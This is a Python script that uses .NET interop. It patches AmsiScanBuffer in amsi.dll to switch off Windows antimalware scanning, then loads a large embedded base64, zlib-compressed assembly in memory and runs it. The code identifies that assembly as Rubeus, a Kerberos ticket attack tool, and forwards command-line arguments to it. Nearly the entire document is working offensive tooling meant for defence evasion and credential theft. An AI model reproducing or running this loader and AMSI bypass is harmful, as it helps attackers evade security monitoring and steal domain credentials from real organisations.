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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def to_clr_array(py_list):
    """
    Converts a Python list to a .NET string array.
    Args:
        py_list: The Python list to convert.
    Returns:
        A .NET string array.
    """
    arr = System.Array.CreateInstance(System.String, len(py_list))
    for i, item in enumerate(py_list):
        arr[i] = item
    return arr

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    rubeus_program_type = assembly.GetType("Rubeus.Program")

    # You don't need to create an instance of the class for a static method
    method = rubeus_program_type.GetMethod("MainString")

    # Convert your command to a .NET string array
    command_args = to_clr_array([command])

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, help='Command to execute (like "help" or "triage")')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()